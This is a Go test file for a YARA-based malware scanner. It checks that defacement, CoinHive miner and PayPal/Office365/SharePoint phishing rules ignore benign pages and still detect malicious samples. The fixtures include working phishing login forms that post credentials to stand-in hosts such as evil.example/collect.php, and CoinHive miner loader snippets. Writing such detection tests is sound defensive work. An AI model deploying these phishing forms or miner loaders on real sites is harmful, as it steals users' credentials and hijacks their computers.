//go:build yara

package yara

import "testing"

func TestFPFlood_DefaceHackedBy_WordfencePros(t *testing.T) {
	s := loadRepoYaraScanner(t)
	readme := []byte("=== Wordfence Security ===\nWeb Application Firewall stops you from getting hacked by identifying malicious traffic.")
	if hasYaraRule(s.ScanBytes(readme), "deface_hacked_by") {
		t.Error("deface_hacked_by FP: matched Wordfence readme prose")
	}
	for _, mal := range [][]byte{
		[]byte("<html><head><title>Hacked By xShadow</title></head><body><h1>Hacked By xShadow</h1></body></html>"),
		[]byte("<center><h2>hacked by MoroccanGhosts</h2></center>"),
	} {
		if !hasYaraRule(s.ScanBytes(mal), "deface_hacked_by") {
			t.Errorf("deface_hacked_by regression: real defacement heading not detected: %s", mal)
		}
	}
}

func TestFPFlood_MinerCoinhive_BotUaList(t *testing.T) {
	s := loadRepoYaraScanner(t)
	botList := []byte("<?php return array('bots'=>array('Googlebot','bingbot','CoinHive','AhrefsBot','SemrushBot'));")
	if hasYaraRule(s.ScanBytes(botList), "miner_coinhive") {
		t.Error("miner_coinhive FP: matched a bot user-agent list containing the brand")
	}
	for _, mal := range [][]byte{
		[]byte("<" + "script src=\"https://coinhive.com/lib/coinhive.min.js\"></" + "script>"),
		[]byte("var miner=new CoinHive.Anonymous('SITE_KEY'); miner." + "start();"),
		[]byte("<" + "script src=\"https://authedmine.com/lib/authedmine.min.js\"></" + "script>"),
	} {
		if !hasYaraRule(s.ScanBytes(mal), "miner_coinhive") {
			t.Errorf("miner_coinhive regression: real CoinHive loader not detected: %s", mal)
		}
	}
}

func TestFPFlood_PhishingPaypal_AdminPageAndScatteredJs(t *testing.T) {
	s := loadRepoYaraScanner(t)
	adminPage := []byte("<div class=\"cn-welcome\"><a href=\"https://paypal.com/donate\">Support us via PayPal</a>\n<form method=\"post\" action=\"payment\" data-action=\"save\"><input type=\"password\" name=\"api_secret\"></form></div>")
	if hasYaraRule(s.ScanBytes(adminPage), "phishing_paypal") {
		t.Error("phishing_paypal FP: matched a plugin admin settings page")
	}
	scattered := append([]byte("/*! jQuery Migrate */ var paypal={};function f(){}"), make([]byte, 400)...)
	scattered = append(scattered, []byte("var s='<form>';var p='type=\"password\"';")...)
	if hasYaraRule(s.ScanBytes(scattered), "phishing_paypal") {
		t.Error("phishing_paypal FP: matched scattered tokens in minified JS")
	}
	mal := []byte("<html><body><h2>Log in to your PayPal account</h2>\n<form action=\"https://evil.example/collect.php\" method=\"post\">\n<input type=\"email\" name=\"email\"><input type=\"password\" name=\"pass\"><button>Log In</button>\n</form></body></html>")
	if !hasYaraRule(s.ScanBytes(mal), "phishing_paypal") {
		t.Error("phishing_paypal regression: real PayPal phishing page not detected")
	}
}

func TestFPFlood_PhishingOffice365Sharepoint_Structure(t *testing.T) {
	s := loadRepoYaraScanner(t)
	adminO365 := []byte("<p>Connect your office365 mailbox</p><form action=\"settings\"><input type=\"password\" name=\"smtp_pass\"></form>")
	if hasYaraRule(s.ScanBytes(adminO365), "phishing_office365") {
		t.Error("phishing_office365 FP: matched a settings form with a route action")
	}
	malO365 := []byte("<h1>Sign in to Office365</h1><form action=\"/harvest.php\" method=\"post\"><input type=\"password\"></form>")
	if !hasYaraRule(s.ScanBytes(malO365), "phishing_office365") {
		t.Error("phishing_office365 regression: real Office365 phishing not detected")
	}
	malSP := []byte("<title>SharePoint Online</title>secured by Microsoft<form action=\"https://x.workers.dev/c\" method=\"post\"><input type=\"email\"><input type=\"password\"></form>window.location.replace(u)")
	if !hasYaraRule(s.ScanBytes(malSP), "phishing_sharepoint") {
		t.Error("phishing_sharepoint regression: real SharePoint phishing not detected")
	}
}
